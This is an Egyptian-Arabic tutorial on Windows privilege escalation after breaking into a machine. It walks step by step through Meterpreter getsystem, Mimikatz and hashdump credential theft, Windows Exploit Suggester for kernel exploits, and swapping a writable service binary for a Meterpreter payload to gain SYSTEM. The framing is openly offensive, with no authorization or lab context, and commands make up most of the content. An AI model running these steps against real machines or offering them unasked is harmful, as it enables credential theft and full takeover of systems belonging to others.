هناخد **Privilege Escalation** من البداية **لحد ما تبقى فاهمه كويس جدًا**، وتعرف إزاي **تتحول من مستخدم عادي لـ Administrator أو حتى SYSTEM** بعد الاختراق.

---

# **🔹 Privilege Escalation بعد الاختراق الأولي 🔹**

## **📌 يعني إيه Privilege Escalation؟**

✅ لما بتخترق جهاز، غالبًا بتدخل بصلاحيات **مستخدم عادي (Limited User)**، ومش هتقدر تتحكم في كل حاجة.  
✅ عشان تاخد **تحكم كامل (Admin أو SYSTEM)**، لازم تلاقي **طريقة لترقية الصلاحيات**.  
✅ فيه طريقتين رئيسيتين:

- **Horizontal Escalation:** تتحول لحساب مستخدم تاني بنفس المستوى.
- **Vertical Escalation:** ترفع صلاحياتك وتبقى **Admin أو SYSTEM**.  
    ✅ بنستخدم أدوات وتقنيات مختلفة لتحقيق ده، زي **استغلال ثغرات النظام، Misconfigurations، أو استخراج كلمات السر**.

---

## **🔥 الطرق الأساسية لرفع الامتيازات (Privilege Escalation)**

### **🟢 1. معرفة الصلاحيات الحالية**

📌 **قبل ما تعمل أي حاجة، لازم تعرف إنت شغال بصلاحيات إيه:**

```bash
whoami
```

🎯 **هتشوف اسم المستخدم الحالي**

📌 **لو عايز تعرف كل الجروبات والصلاحيات اللي عندك:**

```bash
whoami /priv
```

🎯 **هتعرف لو عندك صلاحيات تساعدك في الترقية**

📌 **لو على Meterpreter:**

```bash
meterpreter > getuid
```

🎯 **هيعرض اسم المستخدم الحالي**

📌 **لو عايز تشوف حسابات المستخدمين التانية:**

```bash
net user
```

🎯 **هتعرف مين موجود على الجهاز ومين الـ Admins**

---

### **🟢 2. استخدام GetSystem لرفع الصلاحيات تلقائيًا**

📌 **لو عندك Meterpreter، جرب ترفع صلاحياتك تلقائيًا كده:**

```bash
meterpreter > getsystem
```

🎯 **لو نجح، هتبقى `NT AUTHORITY\SYSTEM`، وده أقوى مستوى صلاحيات على الويندوز!**

📌 **لو الطريقة فشلت، جرب استخدام الـ Exploits يدويًا.**

---

### **🟢 3. استغلال ثغرات النظام (Kernel Exploits)**

📌 **لو النظام مش محدث، ممكن تلاقي ثغرة تساعدك في رفع الصلاحيات. جرب تبحث عن الثغرات المتاحة:**

```bash
systeminfo
```

🎯 **هتشوف إصدار الويندوز والتحديثات اللي عليه**

📌 **استخدم `Windows Exploit Suggester` لمعرفة الثغرات اللي ممكن تستغلها:**

```bash
python windows-exploit-suggester.py --database exploits.csv --systeminfo systeminfo.txt
```

🎯 **لو لقيت ثغرة مناسبة، نفذ الـ Exploit المناسب لرفع الصلاحيات**

---

### **🟢 4. استخراج كلمات المرور من النظام**

📌 **لو تقدر تجيب كلمات السر، ممكن تلاقي حساب Admin تستخدمه بدل ما ترفع الصلاحيات مباشرة. جرب تستخدم Mimikatz كده:**

```bash
meterpreter > load mimikatz
meterpreter > mimikatz_command -f "privilege::debug"
meterpreter > mimikatz_command -f "sekurlsa::logonpasswords"
```

🎯 **هتلاقي كلمات السر مخزنة لو الجهاز مش محمي كويس**

📌 **ممكن تستخدم `hashdump` لاستخراج الهاشات:**

```bash
meterpreter > hashdump
```

🎯 **هتقدر تستخدم `John The Ripper` أو `hashcat` لكسر التشفير**

---

### **🟢 5. استغلال Misconfigurations**

📌 **لو الحساب العادي عنده صلاحيات يغير الملفات في أماكن حساسة، ممكن تستغل ده لرفع الصلاحيات. جرب تشوف الصلاحيات كده:**

```bash
icacls C:\Windows\System32
```

🎯 **لو تقدر تعدّل ملفات النظام، ممكن تزرع Backdoor وتنفذه بصلاحيات عالية**

📌 **جرب تبحث عن خدمات (Services) بتشتغل بصلاحيات Admin وتقدر تعدّل عليها:**

```bash
wmic service get name,pathname,startmode
```

🎯 **لو لقيت خدمة بتشغل ملف قابل للتعديل، استبدله ببايلود Meterpreter وابدأ الجلسة من جديد بصلاحيات SYSTEM!**

---

### **🟢 6. تشغيل PowerShell بصلاحيات عالية**

📌 **لو تقدر تفتح PowerShell، جرب تنفذ ده:**

```powershell
Start-Process powershell -Verb runAs
```

🎯 **هيحاول يفتح PowerShell بصلاحيات أعلى**

📌 **لو معاك حساب Admin، جرب تسجل دخول بصلاحياته:**

```bash
runas /user:Administrator cmd.exe
```

🎯 **لو عندك الباسورد، هتفتح CMD بصلاحيات Admin**

---

# **💡 الخلاصة بالمصري:**

1️⃣ **أول حاجة، لازم تعرف إنت بصلاحيات إيه (`whoami` و `whoami /priv`)**  
2️⃣ **جرب `getsystem` على Meterpreter، لو نفع تبقى وصلت لـ SYSTEM!**  
3️⃣ **لو النظام قديم، شوف الثغرات (`systeminfo`) واستخدم Windows Exploit Suggester**  
4️⃣ **حاول تسرق كلمات السر (`mimikatz` أو `hashdump`)، ممكن تلاقي حساب Admin جاهز**  
5️⃣ **لو عندك صلاحيات على ملفات حساسة (`icacls` و `wmic service`)، استغلها وعدّل على الخدمات اللي بتشتغل بصلاحيات Admin**  
6️⃣ **جرب تشغل PowerShell أو CMD بصلاحيات أعلى (`runas /user:Administrator cmd.exe`)**

---

# **🛠️ خطوات عملية لترقية الصلاحيات:**

✅ **1. تحقق من الصلاحيات الحالية:**

```bash
whoami
whoami /priv
```

✅ **2. جرب `getsystem` لو معاك Meterpreter:**

```bash
meterpreter > getsystem
```

✅ **3. اكتشف الثغرات الممكنة:**

```bash
systeminfo
python windows-exploit-suggester.py --database exploits.csv --systeminfo systeminfo.txt
```

✅ **4. حاول استخراج كلمات السر باستخدام `mimikatz`:**

```bash
meterpreter > load mimikatz
meterpreter > mimikatz_command -f "sekurlsa::logonpasswords"
```

✅ **5. ابحث عن Misconfigurations:**

```bash
icacls C:\Windows\System32
wmic service get name,pathname,startmode
```

✅ **6. جرب تشغيل PowerShell أو CMD بصلاحيات أعلى:**

```powershell
Start-Process powershell -Verb runAs
runas /user:Administrator cmd.exe
```

🎯 **لو مشيت بالخطوات دي، فرصتك في رفع الصلاحيات هتزيد جدًا، وهتقدر تتحكم في الجهاز بالكامل!** 🚀🔥